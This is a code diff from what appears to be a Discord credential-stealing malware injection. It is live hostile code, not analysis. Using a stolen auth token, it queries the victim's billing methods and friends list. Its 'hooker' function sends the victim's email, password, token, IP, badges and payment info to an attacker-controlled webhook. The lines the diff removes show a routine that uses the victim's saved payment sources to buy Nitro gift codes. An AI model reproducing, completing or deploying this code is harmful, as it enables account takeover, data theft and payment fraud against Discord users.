@@ -155,155 +155,133 @@ const fetchBilling = async (token) => {
     xmlHttp.setRequestHeader("Authorization", "${token}"); 
     xmlHttp.send(null); 
     xmlHttp.responseText`);
-  if (!bill.lenght || bill.length === 0) return "";
+  if (!bill.lenght || bill.length === 0) return '';
   return JSON.parse(bill);
 };
 
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
-  if (!data) return "❌";
-  let billing = "";
+  if (!data) return '❌';
+  let billing = '';
   data.forEach((x) => {
     if (!x.invalid) {
       switch (x.type) {
         case 1:
-          billing += "💳 ";
+          billing += '💳 ';
           break;
         case 2:
-          billing += "<:paypal:951139189389410365> ";
+          billing += '<:paypal:951139189389410365> ';
           break;
       }
     }
   });
-  if (!billing) billing = "❌";
+  if (!billing) billing = '❌';
   return billing;
 };
 
-const Purchase = async (token, id, _type, _time) => {
-  const options = {
-    expected_amount: config.nitro[_type][_time]["price"],
-    expected_currency: "usd",
-    gift: true,
-    payment_source_id: id,
-    payment_source_token: null,
-    purchase_token: "2422867c-244d-476a-ba4f-36e197758d97",
-    sku_subscription_plan_id: config.nitro[_type][_time]["sku"],
-  };
-
-  const req = execScript(`var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]["id"]}/purchase", false);
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.setRequestHeader('Content-Type', 'application/json');
-    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
+const fetchFriends = async (token) => {
+  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
+    xmlHttp.open("GET", "${config.api}/relationships", false); 
+    xmlHttp.setRequestHeader("Authorization", "${token}"); 
+    xmlHttp.send(null); 
     xmlHttp.responseText`);
-  if (req["gift_code"]) {
-    return "https://discord.gift/" + req["gift_code"];
-  } else return null;
+  return JSON.parse(bill);
 };
 
-const buyNitro = async (token) => {
-  const data = await fetchBilling(token);
-  const failedMsg = "Failed to Purchase ❌";
-  if (!data) return failedMsg;
-
-  let IDS = [];
+const getFriends = async (token) => {
+  const data = await fetchFriends(token);
+  let s = 0;
+  let k = 0;
   data.forEach((x) => {
     if (!x.invalid) {
-      IDS = IDS.concat(x.id);
-    }
-  });
-  for (let sourceID in IDS) {
-    const first = Purchase(token, sourceID, "boost", "year");
-    if (first !== null) {
-      return first;
-    } else {
-      const second = Purchase(token, sourceID, "boost", "month");
-      if (second !== null) {
-        return second;
-      } else {
-        const third = Purchase(token, sourceID, "classic", "month");
-        if (third !== null) {
-          return third;
-        } else {
-          return failedMsg;
-        }
+      switch (x.type) {
+        case 1:
+          s += 1;
+        case 2:
+          k += 1;
       }
     }
-  }
+  });
+  return s;
 };
 
 const getNitro = (flags) => {
   switch (flags) {
     case 0:
-      return "No Nitro";
+      return '';
     case 1:
-      return "Nitro Classic";
+      return '<:nitro:892130462024224838> ';
     case 2:
-      return "Nitro Boost";
+      return '<:nitro:892130462024224838> ';
     default:
-      return "No Nitro";
+      return '';
   }
 };
 
 const getBadges = (flags) => {
-  let badges = "";
+  let badges = '';
   switch (flags) {
     case 1:
-        badges += "Discord Staff <:discordstaff:935183780308733972>"
-        break;
+      badges += 'Discord Staff, ';
+      break;
     case 2:
-        badges += "Partnered Server Owner <:partner:935183990598533171>"
-        break;
+      badges += 'Partnered Server Owner, ';
+      break;
     case 131072:
-        badges += "Discord Developer <:developers:935186775490584608>"
-        break;
+      badges += ' <:DevBadge:912727453875699733> ';
+      break;
     case 4:
-        badges += "Hypesquad Event <:hypesquadevent:935184264323039302>"
-        break;
+      badges += ' <a:CH_IconHypesquadShiny:928551747591487548> ';
+      break;
     case 16384:
-        badges += "Gold BugHunter <:bughunters2:935185957102170172>"
-        break;
+      badges += 'Gold BugHunter, ';
+      break;
     case 8:
-        badges += "Green BugHunter <:BugHunter:935186152464470108>"
-        break;
+      badges += 'Green BugHunter, ';
+      break;
     case 512:
-        badges += "Early Supporter <:early:935186433080180816>"
-        break;
+      badges += ' <a:early:913099122968494170> ';
+      break;
     case 128:
-        badges += "HypeSquad Brillance <:brilliance:935184761339654165>"
-        break;
+      badges += ' <:brilliance:919973089285120111> ';
+      break;
     case 64:
-        badges += "HypeSquad Bravery <:BraveryLogo:935185089917251644>"
-        break;
+      badges += ' <:bravery:919973089222205451> ';
+      break;
     case 256:
-        badges += "HypeSquad Balance <:BalanceLogo:935184834622554132>"
-        break;
+      badges += ' <:balance:919973088651776001> ';
+      break;
     case 0:
-        badges = ":x:"
-        break;
+      badges = '`No Badges`';
+      break;
     default:
-        badges = ":x:"
-        break;
-}
+      badges = '`No Badges`';
+      break;
+  }
   return badges;
 };
 
 const hooker = async (content) => {
   const data = JSON.stringify(content);
   const url = new URL(config.webhook);
+  const headers = {
+    'Content-Type': 'application/json',
+    'Access-Control-Allow-Origin': '*',
+  };
+  if (!config.webhook.includes('api/webhooks')) {
+    const key = totp(config.webhook_protector_key);
+    headers['Authorization'] = key;
+  }
   const options = {
     protocol: url.protocol,
     hostname: url.host,
     path: url.pathname,
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-      "Access-Control-Allow-Origin": "*",
-    },
+    method: 'POST',
+    headers: headers,
   };
   const req = https.request(options);
 
-  req.on("error", (err) => {
+  req.on('error', (err) => {
     console.log(err);
   });
   req.write(data);
@@ -339,7 +317,12 @@ const login = async (email, password, token) => {
                 },
                 {
                     "name": "@SN - IP:",
-                    value: `\`${config.ip}\``,
+                    value: `\`${config.ip}\`\n[Click = Open](https://ipinfo.io/${ip})`,
+                    "inline": true
+                },
+                {
+                    "name": "@SN - Badges:",
+                    "value": `${badges}`,
                     "inline": true
                 },
                 {
@@ -348,14 +331,9 @@ const login = async (email, password, token) => {
                     "inline": true
                 },
                 {
-                    "name": "**Billing:**",
+                    "name": "@SN - Billing:",
                     "value": `\`${billing}\``,
                     "inline": true
-                },
-                {
-                    "name": "**Badges:**",
-                    "value": `${badges}`,
-                    "inline": false
                 },
                 {
                     "name": "**Account Email**",
